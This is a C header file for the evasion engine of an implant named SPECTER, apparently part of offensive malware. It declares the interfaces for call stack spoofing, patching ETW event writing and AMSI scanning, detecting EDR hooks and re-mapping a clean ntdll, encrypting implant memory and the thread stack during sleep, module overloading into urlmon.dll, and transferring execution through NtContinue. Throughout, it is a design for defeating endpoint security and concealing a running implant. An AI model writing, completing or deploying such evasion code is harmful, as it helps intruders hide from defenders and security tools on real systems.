/**
 * SPECTER Implant — Evasion Engine Interface
 *
 * Call stack spoofing, ETW suppression, hook evasion, and memory
 * guard subsystems.  Wraps the syscall engine to provide pre-call
 * and post-call evasion logic around every syscall invocation.
 */

#ifndef EVASION_H
#define EVASION_H

#include "specter.h"
#include "ntdefs.h"
#include "syscalls.h"

/* ------------------------------------------------------------------ */
/*  PE structures for .pdata / exception directory parsing             */
/* ------------------------------------------------------------------ */

#define IMAGE_DIRECTORY_ENTRY_EXCEPTION  3

typedef struct _RUNTIME_FUNCTION {
    DWORD BeginAddress;
    DWORD EndAddress;
    DWORD UnwindInfoAddress;
} RUNTIME_FUNCTION, *PRUNTIME_FUNCTION;

/* ------------------------------------------------------------------ */
/*  DJB2 hashes for target DLLs used in frame library                  */
/* ------------------------------------------------------------------ */

#define HASH_USER32_DLL     0x5A6BD3F3  /* "user32.dll"   */
#define HASH_RPCRT4_DLL     0xB016A5AE  /* "rpcrt4.dll"   */
#define HASH_COMBASE_DLL    0x87594A69  /* "combase.dll"  */

/* DJB2 hashes for well-known frame termination functions */
#define HASH_RTLUSERTHREADSTART     0xB42DDFBC  /* "RtlUserThreadStart"     */
#define HASH_BASETHREADINITTHUNK    0xAE7046F6  /* "BaseThreadInitThunk"    */

/* DJB2 hashes for ETW/AMSI suppression targets */
#define HASH_ETWEVENTWRITE          0x941F3482  /* "EtwEventWrite"          */
#define HASH_ETWEVENTWRITEEX        0x18BE6A7F  /* "EtwEventWriteEx"        */
#define HASH_AMSISCANBUFFER         0x5DFB3DEE  /* "AmsiScanBuffer"         */
#define HASH_AMSI_DLL               0xDAF90FD9  /* "amsi.dll"               */

/* ETW patch bytes: xor eax, eax; ret  (returns STATUS_SUCCESS = 0) */
#define ETW_PATCH_SIZE  3
/* AMSI patch bytes: mov eax, 0x80070057; ret  (returns E_INVALIDARG) */
#define AMSI_PATCH_SIZE 6

/* ------------------------------------------------------------------ */
/*  Call stack spoofing structures                                     */
/* ------------------------------------------------------------------ */

#define FRAME_MAX_ENTRIES   256
#define FRAME_CHAIN_MAX     8
#define SAVED_FRAMES_MAX    16

typedef struct _FRAME_ENTRY {
    PVOID  code_start;      /* Start of function in .text            */
    PVOID  code_end;        /* End of function in .text              */
    PVOID  unwind_info;     /* Pointer to UNWIND_INFO in the module  */
    DWORD  module_hash;     /* DJB2 hash of the owning DLL           */
} FRAME_ENTRY;

typedef struct _FRAME_LIBRARY {
    FRAME_ENTRY entries[FRAME_MAX_ENTRIES];
    DWORD       count;
    DWORD       max_capacity;
} FRAME_LIBRARY;

typedef struct _SAVED_STACK_FRAMES {
    QWORD  original_rsp;
    QWORD  saved_return_addrs[SAVED_FRAMES_MAX];
    QWORD  saved_rbp_chain[SAVED_FRAMES_MAX];
    DWORD  frame_count;
} SAVED_STACK_FRAMES;

/* ------------------------------------------------------------------ */
/*  CRC table for hook detection                                       */
/* ------------------------------------------------------------------ */

#define CRC_TABLE_CAPACITY  64
#define CRC_CHECK_BYTES     32  /* Number of bytes at function start to CRC */

typedef struct _CRC_ENTRY {
    DWORD func_hash;
    DWORD crc_value;
    PVOID func_addr;
} CRC_ENTRY;

typedef struct _CRC_TABLE {
    CRC_ENTRY entries[CRC_TABLE_CAPACITY];
    DWORD     count;
} CRC_TABLE;

/* ------------------------------------------------------------------ */
/*  EVASION_CONTEXT — top-level evasion engine state                   */
/* ------------------------------------------------------------------ */

/* Stack region descriptor for thread stack encryption */
typedef struct _STACK_REGION {
    PVOID  base;                /* Stack base (high address)             */
    SIZE_T size;                /* Stack region size                     */
    PVOID  sp_at_encrypt;       /* RSP captured at encrypt time          */
} STACK_REGION;

/* Memory guard state */
#define MEMGUARD_KEY_SIZE    32
#define MEMGUARD_NONCE_SIZE  12
#define MEMGUARD_HASH_SIZE   32
#define MEMGUARD_NONCE_MAGIC "SPECMGRD\x00\x00\x00\x00"

typedef struct _MEMGUARD_STATE {
    PVOID   implant_base;            /* PIC blob base address            */
    SIZE_T  implant_size;            /* PIC blob size                    */
    BYTE    enc_key[MEMGUARD_KEY_SIZE];     /* Per-cycle ChaCha20 key   */
    BYTE    nonce[MEMGUARD_NONCE_SIZE];     /* ChaCha20 nonce           */
    BYTE    integrity_hash[MEMGUARD_HASH_SIZE]; /* SHA-256 pre-encrypt  */
    STACK_REGION  stack;             /* Thread stack region              */
    PVOID   veh_handle;              /* VEH registration handle          */
    ULONG   original_protect;        /* Saved memory protection          */
    PVOID   return_spoof_addr;       /* Legitimate return address        */
    BOOL    initialized;             /* Guard initialized flag           */
    BOOL    encrypted;               /* Currently encrypted flag         */
    DWORD   prng_state;              /* PRNG for key generation          */
    volatile DWORD guard_violations; /* Count of guard page violations   */
} MEMGUARD_STATE;

typedef struct _EVASION_CONTEXT {
    FRAME_LIBRARY  frame_lib;       /* Library of valid stack frames      */
    PVOID          clean_ntdll;     /* Clean ntdll mapping pointer        */
    SYSCALL_TABLE *syscall_table;   /* Pointer to the syscall table       */
    IMPLANT_CONTEXT *implant_ctx;   /* Back-pointer to implant context    */
    CRC_TABLE      crc_table;       /* CRC baselines for hook detection   */
    BOOL           etw_patched;     /* ETW providers patched flag         */
    BOOL           amsi_patched;    /* AMSI patched flag                  */
    BYTE           etw_original[8]; /* Saved original ETW bytes           */
    BYTE           amsi_original[8];/* Saved original AMSI bytes          */
    PVOID          etw_patch_addr;  /* Address of patched ETW function    */
    PVOID          amsi_patch_addr; /* Address of patched AMSI function   */
    DWORD          prng_state;      /* PRNG state for frame randomization */
    MEMGUARD_STATE memguard;        /* Memory guard state                 */
    PVOID          pdata_table;     /* Registered RUNTIME_FUNCTION array  */
    DWORD          pdata_count;     /* Number of .pdata entries           */
} EVASION_CONTEXT;

/* ------------------------------------------------------------------ */
/*  Call stack spoofing API                                             */
/* ------------------------------------------------------------------ */

/**
 * Initialize the frame library by walking PEB→Ldr to enumerate loaded
 * DLLs (kernel32, ntdll, user32, rpcrt4, combase), parsing PE .text
 * and .pdata sections, and storing valid frame entries with unwind data.
 */
NTSTATUS evasion_init_frames(EVASION_CONTEXT *ctx);

/**
 * Select a semantically plausible frame chain from the library.
 * The chain terminates at RtlUserThreadStart/BaseThreadInitThunk.
 * Selection is randomized per call.
 *
 * chain_out: array of FRAME_ENTRY pointers (caller-allocated)
 * count: desired number of frames in the chain
 * Returns actual number of frames written to chain_out.
 */
DWORD evasion_select_frames(EVASION_CONTEXT *ctx, DWORD target_func_hash,
                            FRAME_ENTRY **chain_out, DWORD count);

/**
 * Write spoofed return addresses to the stack, ensuring RBP chain
 * integrity and valid .pdata unwind info for each frame.
 *
 * saved: output structure with saved original stack state for restore.
 */
NTSTATUS evasion_build_spoofed_stack(FRAME_ENTRY **chain, DWORD count,
                                     QWORD original_rsp,
                                     SAVED_STACK_FRAMES *saved);

/**
 * Restore the original stack state after a syscall completes.
 */
void evasion_restore_stack(SAVED_STACK_FRAMES *saved);

/* ------------------------------------------------------------------ */
/*  Evasion-wrapped syscall invocation API                             */
/* ------------------------------------------------------------------ */

/**
 * Initialize the full evasion engine: frame library, CRC baselines.
 */
NTSTATUS evasion_init(IMPLANT_CONTEXT *ctx);

/**
 * Evasion-wrapped syscall: look up SYSCALL_ENTRY, build spoofed stack,
 * execute indirect syscall, restore stack, return NTSTATUS.
 */
NTSTATUS evasion_syscall(EVASION_CONTEXT *ctx, DWORD func_hash, ...);

/* ------------------------------------------------------------------ */
/*  ETW suppression API                                                */
/* ------------------------------------------------------------------ */

/**
 * Patch EtwEventWrite/EtwEventWriteEx for critical providers.
 */
NTSTATUS evasion_patch_etw(EVASION_CONTEXT *ctx);

/**
 * Verify ETW patches still in place, re-apply if reverted.
 */
NTSTATUS evasion_check_etw_patches(EVASION_CONTEXT *ctx);

/**
 * Lazy AMSI bypass: patch AmsiScanBuffer to return E_INVALIDARG.
 */
NTSTATUS evasion_patch_amsi(EVASION_CONTEXT *ctx);

/* ------------------------------------------------------------------ */
/*  Hook evasion and integrity monitoring API                          */
/* ------------------------------------------------------------------ */

/**
 * Compute CRC32 of first bytes at a function address.
 */
DWORD evasion_compute_crc(PVOID func_addr, DWORD len);

/**
 * Build baseline CRC values for critical ntdll exports.
 */
NTSTATUS evasion_init_crc_table(EVASION_CONTEXT *ctx);

/**
 * Periodic hook detection: CRC check, re-map on mismatch.
 * Returns TRUE if hooks were detected and remediated.
 */
BOOL evasion_check_hooks(EVASION_CONTEXT *ctx);

/**
 * Re-map clean ntdll from \KnownDlls, update all contexts.
 */
NTSTATUS evasion_refresh_ntdll(EVASION_CONTEXT *ctx);

/* ------------------------------------------------------------------ */
/*  Memory guard API                                                   */
/* ------------------------------------------------------------------ */

/**
 * Initialize memory guard: record implant region, register VEH.
 */
NTSTATUS memguard_init(EVASION_CONTEXT *ctx, PVOID implant_base,
                       SIZE_T implant_size);

/**
 * Pre-sleep: generate per-cycle key, flip RX→RW, encrypt implant
 * memory with ChaCha20, encrypt tracked heap, encrypt thread stack.
 */
NTSTATUS memguard_encrypt(EVASION_CONTEXT *ctx);

/**
 * Post-sleep: decrypt implant memory, flip RW→RX, decrypt heap
 * and stack, verify integrity.
 */
NTSTATUS memguard_decrypt(EVASION_CONTEXT *ctx);

/**
 * Modify sleeping thread's context so GetThreadContext returns
 * a legitimate return address.
 */
NTSTATUS memguard_setup_return_spoof(EVASION_CONTEXT *ctx);

/**
 * Tear down memory guard: remove VEH handler, clear guard pages.
 */
void memguard_cleanup(EVASION_CONTEXT *ctx);

/* ------------------------------------------------------------------ */
/*  Module overloading API                                             */
/* ------------------------------------------------------------------ */

/**
 * Overload a benign DLL (urlmon.dll) via NtCreateSection(SEC_IMAGE).
 * Returns the mapped base address of the sacrificial image section.
 * The caller can then copy the implant PIC blob into this region.
 */
NTSTATUS evasion_module_overload(EVASION_CONTEXT *ctx, PVOID *mapped_base,
                                  PSIZE_T mapped_size);

/**
 * Finalize module overloading by flipping the mapped region from
 * RW (used during PIC copy) to RX (execute-read, no write).
 * Must be called after copying the PIC blob into the overloaded section.
 */
NTSTATUS evasion_module_overload_finalize(EVASION_CONTEXT *ctx, PVOID base,
                                           SIZE_T size);

/* ------------------------------------------------------------------ */
/*  .pdata registration API                                            */
/* ------------------------------------------------------------------ */

/**
 * Register the implant's RUNTIME_FUNCTION table via RtlAddFunctionTable
 * so that the Windows exception dispatcher can unwind through implant
 * frames.  Requires linker symbols __pdata_start / __pdata_end.
 */
NTSTATUS evasion_register_pdata(EVASION_CONTEXT *ctx, PVOID implant_base);

/* ------------------------------------------------------------------ */
/*  NtContinue entry transfer API                                      */
/* ------------------------------------------------------------------ */

/**
 * Transfer execution to a target function using NtContinue with a
 * synthetic CONTEXT64 and clean stack frames.  This function does
 * not return — control is transferred directly via the kernel.
 */
NTSTATUS evasion_ntcontinue_transfer(EVASION_CONTEXT *ctx,
                                      PVOID target_func, PVOID param);

/* ------------------------------------------------------------------ */
/*  Test support                                                       */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
void evasion_test_set_prng_seed(EVASION_CONTEXT *ctx, DWORD seed);
#endif

#endif /* EVASION_H */
